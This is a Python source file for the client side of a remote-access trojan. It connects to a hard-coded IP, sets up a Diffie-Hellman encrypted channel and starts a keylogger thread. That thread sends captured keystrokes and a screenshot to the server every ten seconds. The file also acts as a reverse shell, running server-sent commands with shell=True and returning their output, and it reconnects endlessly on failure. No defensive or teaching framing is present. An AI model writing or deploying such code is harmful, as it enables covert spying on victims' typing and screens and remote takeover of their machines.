import select
import sys
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization, hashes
import socket
import threading
from datetime import datetime
import protocol
import os
import subprocess
import pyautogui
from pynput import keyboard
import time

# constants
IP = "192.168.3.17"
PHOTO_PATH = r"test.jpg"  # The path + filename where the screenshot at the server should be saved
LENGTH_FIELD_SIZE = 4
TIME_LOOP_KEY_LOGGER = 10

# new_directory = os.getcwd()
# if not os.path.exists(new_directory):
#    os.makedirs(new_directory)
# os.chmod(new_directory, 0o777)
# PHOTO_PATH = os.path.join(new_directory, 'test.jpg')

# global variables
keys = []
message_for_server = []


# Create a Diffie-Hellman client object
def create_dh_key(param_bytes):
    # Create a Diffie-Hellman client object
    parameters = serialization.load_pem_parameters(param_bytes, backend=default_backend())
    private_key = parameters.generate_private_key()
    public_key = private_key.public_key()
    return private_key, public_key


# initialize the handshake with the server with DH
def initialize_handshake(client_socket):
    # get the parameters from the server
    param_bytes = client_socket.recv(1024)
    client_private_key, client_public_key = create_dh_key(param_bytes)
    # Send the client's public key to the server
    client_public_key_bytes = client_public_key.public_bytes(
        serialization.Encoding.PEM,
        serialization.PublicFormat.SubjectPublicKeyInfo
    )
    # Send the client's public key to the server
    client_socket.sendall(client_public_key_bytes)
    # Receive the server's public key
    server_public_key_bytes = client_socket.recv(1024)
    server_public_key = serialization.load_pem_public_key(server_public_key_bytes)
    # Derive the shared secret key using the server's public key  
    shared_key = client_private_key.exchange(server_public_key)
    shared_key_digest = hashes.Hash(hashes.SHA256())
    shared_key_digest.update(shared_key)
    shared_key = shared_key_digest.finalize()
    return shared_key


# this function get all the keyboard events and save them in a string
def key_pressed(key):
    key = str(key).replace("'", "")
    if key in {'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M' 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U',
               'V', 'W', 'X', 'Y', 'Z',
               'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u',
               'v', 'w', 'x', 'y', 'z'
                                   ':', ",", "[", "]", "{", "}", "<", ">", "?", "!", "@", "#", "$", "%", ".", "/", "^",
               "&", "*", "(", ")", "-", "_", "=", "+", "\\",
               "~", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0"}:
        keys.append(key)
    if key == 'Key.space':
        key = ' '
        keys.append(key)
    if key == 'Key.shift_r':
        key = ''
        keys.append(key)
    if key == "Key.enter":
        key = '\n\t\t'
        keys.append(key)


def key_logger():
    # listen to the keyboard events
    listener = keyboard.Listener(on_press=key_pressed)
    listener.start()
    while True:
        time.sleep(TIME_LOOP_KEY_LOGGER)
        # Get the current date key logger and time
        keys.append("\n")
        now = datetime.now()
        result = f'{now:%d/%m/%Y %H:%M:%S} {"".join(keys)}'
        # Add the message to the message list
        message_for_server.append(("KEY_LOGGER_TEXT", result))
        keys.clear()

        # Take a screenshot and send it to the server without saving it locally
        screenshot = pyautogui.screenshot()
        screenshot.save(PHOTO_PATH)
        data_image = open(PHOTO_PATH, "rb").read()
        # Add the pic to the message list
        message_for_server.append(("KEY_LOGGER_PICTURE", data_image))
        os.remove(PHOTO_PATH)


def connect_to_socket(ip, port):
    while True:
        try:
            # Create a socket object
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # Connect to the server
            s.connect((ip, port))
            print("Connected to the server")
            return s
        except socket.error as e:
            print("Failed to connect to the server. Error: ", e)
            time.sleep(5)
            continue


def main():
    try:
        # Connect to the server
        client_socket = connect_to_socket(IP, protocol.PORT)
        # initialize the handshake
        shared_key = initialize_handshake(client_socket)
        # Start the key_logger
        key_logger_thread = threading.Thread(target=key_logger)
        key_logger_thread.start()

        while True:
            try:
                rlist, wlist, xlist = select.select([client_socket], [client_socket], [], 1)
                # send message to server
                if client_socket in wlist:
                    if len(message_for_server) > 0:
                        message = message_for_server.pop(0)
                        protocol.send_message(client_socket, message[0], message[1], shared_key)
                # Get message from server
                if client_socket in rlist:
                    # Receive the encrypted data from the server
                    command = client_socket.recv(1024)
                    decrypted_command = protocol.decode_message(command, shared_key).decode()
                    print("New command: ", decrypted_command)
                    try:
                        # Execute the command and send the result to the server
                        if decrypted_command[:2] == 'cd':
                            os.chdir(decrypted_command[3:])
                        if len(decrypted_command) > 0:
                            if decrypted_command == "EXIT":
                                # close the program
                                sys.exit()
                            cmd = subprocess.Popen(decrypted_command, shell=True, stdout=subprocess.PIPE,
                                                stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                            output_bytes = cmd.stdout.read() + cmd.stderr.read()
                            # Send the result to the server
                            message_to_send = str(output_bytes.decode()) + str(os.getcwd())
                            # Add the message to the message list
                            message_for_server.append(("REVERSE_SHELL", message_to_send))
                    except Exception as e:
                        print("Error: ", e)
                        protocol.send_message(client_socket, "INFO", str(e), shared_key)

            except socket.error as e:
                print("Error: ", e)
                client_socket.close()
                # start the program again
                main()
    except:
        time.sleep(10)
        main()


if __name__ == '__main__':
    main()
